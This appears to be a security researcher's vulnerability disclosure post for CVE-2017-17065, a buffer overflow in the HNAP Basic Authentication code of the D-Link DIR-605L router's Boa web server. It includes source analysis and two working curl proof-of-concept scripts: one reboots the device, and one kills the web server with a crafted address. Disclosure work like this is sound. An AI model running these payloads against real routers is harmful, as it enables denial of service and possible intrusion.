---
title: "CVE-2017-17065: D-Link DIR-605L HNAP Basic Authentication Buffer Overflow Discovery+Analysis"
layout: post
category: vuln-report
tags: dlink cve exploit vulnerability
---

## Overview
While testing different inputs in the HNAP functionality of the D-Link DIR-605L/B, I managed to cause a reboot of the device by sending sufficiently large string values in the HTTP Basic Authentication password field. If a long enough value was sent, the next request to the web server would cause the crash. The PoC script below triggers this behavior.


### Denial of Service PoC
```s
#!/usr/bin/env bash
TARGET='172.16.100.1'
pwn1=$(python -c "print('A'*120)")

curl -vv -u admin:"${pwn1}" --header "content-type: text/soap+xml; charset=utf-8" --data @soap.xml http://172.16.100.1/HNAP
curl -vv -u admin:pwned --header "content-type: text/soap+xml; charset=utf-8" --data @soap.xml http://172.16.100.1/HNAP
```

*Note: the xml file provided does not need to contain valid XML.*

### Details
- **Name**: D-Link Wireless N300 Cloud Router
- **Model**: DIR-605L Model B
- **Firmware Version**: <= 2.10B01
- **Vulnerability**: Denial of service, possibly RCE


## Code Analysis - Location of the Bug
I had previously downloaded an archive of all GPL code in use for this device and went looking for the Boa web server source code. After a bit of recursive grep action, I found what I was looking for. 

The bug is present in the file `requests.c`. Specifically, it is in the function `process_option_line()`. If a request uses the POST HTTP method and the request URI path is '/HNAP', a code block is reached that reads the portion of the request header that contains the Basic HTTP authentication string. The authentication string is passed to `base64decode()` and the resulting output is copied into a char array of size 128 bytes, `userAuth`. `sprintf()` then copies the data from the 128 byte array into the 50 byte char array `hnap_admin_password`. This results in a buffer overflow of 122-50 bytes.


```c
#if defined(SUPPORT_HNAP)
char hanp_admin_name[50]={0};
char hnap_admin_password[50]={0};
int hnap_auth_flag=0;
#endif

[...]

#if defined(SUPPORT_HNAP)
//if ((strncasecmp(req->request_uri, "/HNAP", 5) == 0)) {
if ((req->method == M_POST) && (strncasecmp(req->request_uri, "/HNAP", 5) == 0)) {
		if (strncasecmp((char *)line, "Authorization", 13) == 0) {
			char userAuth[0x80];
			char *cp;
			if (strncasecmp(value, "Basic ", 6)) {
				printf("Can only handle Basic auth\n");
				send_r_bad_request(req);
				return 0;
			}			
			base64decode(userAuth, value+6, sizeof(userAuth));				
			if ( (cp = strchr(userAuth,':')) == 0 ) {			
				printf("No user:pass in Basic auth\n");
				send_r_bad_request(req);
				return 0;
			}				
			*cp++=0;
			sprintf(hanp_admin_name, "%s",userAuth);
			if(cp[0]){
				sprintf(hnap_admin_password, "%s", cp);
			}else{
				hnap_admin_password[0]=0;
			}
			return 1;
		}
	}
#endif
```


## Exploitation: Potential Remote Code Execution PoC
Further testing showed that given 108 bytes of junk data followed by certain memory addresses, it was possible to kill Boa without crashing the entire device. This indicates that given a properly crafted payload, it may be possible to achieve code execution. The PoC script below reliably kills Boa and closes port 80 on the router without rebooting the device.

```s
#!/usr/bin/env bash
TARGET='172.16.100.1'
pwn1=$(python -c "print('A'*108+'\x7f\x80\x50\x01')")

curl -vv -u admin:"${pwn1}" --header "content-type: text/soap+xml; charset=utf-8" --data @soap.xml http://172.16.100.1/HNAP
curl -vv -u admin:pwned --header "content-type: text/soap+xml; charset=utf-8" --data @soap.xml http://172.16.100.1/HNAP
```

I have not yet written working shellcode to attempt to exploit this bug further, but it may be something I do in the future. 


## References
- [Mitre: CVE-2017-17065](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17065)
- [DIR-605L Firmware Downloads](http://support.dlink.com/productinfo.aspx?m=DIR-605L)
- [D-Link Security Advisory](ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/DIR-605L_REVB_FIRMWARE_PATCH_NOTES_2.11betaB06_HBRF_EN.pdf)
- [GPL Source Code](http://tsd.dlink.com.tw/downloads2008detail.asp)